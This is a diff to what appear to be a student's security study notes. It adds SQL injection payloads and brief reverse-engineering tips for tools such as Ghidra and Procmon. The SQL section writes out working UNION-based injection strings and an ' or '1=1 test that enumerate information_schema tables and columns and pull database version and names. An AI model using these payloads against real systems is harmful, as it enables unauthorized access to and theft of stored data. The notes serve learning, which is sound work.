@@ -166,16 +166,23 @@ SQL INJECTION
     Database schemas
 
     after php:     
-        1.) Selection=2 Union select 1, table_name, 3 from information_schema.tables
+        1.) Selection=2 Union select 1, table_name, 3 from information_schema.tables    
+            this lists all tables
         2.) Selection=2 Union select table_schema,table_name, null from information_schema.tables
-                <database name> <table name>
+                table_schema = the database name 
         3.) Selection=2 Union select table_name,null,column_name from information_schema.columns
-                shows column properties of tables
+                shows column properties of all tables
         4.) Seleciton=2 Union select name,cost,null from Tires
                 pull back relevant info
+
+        switch location of columns until it works
+('First', 'Last', 'User', 'Pass', 'Email', 3) >
     
     through text box
-        Audi' union select table_name,null,table_schema,4,5 from information_schema.tables #
+        test if it works:
+            Audi' or '1=1
+        
+        Audi' union select table_name,null,table_schema,4,5 from information_schema.tables #        remember to include the #
             uses Audi table which is prone to sql injection
 
         Audi' union select table_name,null,column_name,4,5 from information_schema.columns #
@@ -186,7 +193,24 @@ SQL INJECTION
         Audi' union select @@version,null,database(),null,null from session.Tires #
             session is the database name, Tires is the table
 
-    
+Reverse Engineering    
+    Static Analysis
+        CFF Explorer
+            look at .dll s
+            type of executable
+    Behavioral Analysis
+        Procmon, fakenet
+    Disassembly
+        Ghidra
+            Under Symbol Tree
+                Check for odd functions (main...)
+                Check C converted (not always accurate)
+                    Rename functions, variables to what they do
+            Where to start
+                check for strings
+                in ghidra, search for the string to see where to start 
+            Function Graphs
+                follow 
 
 
 
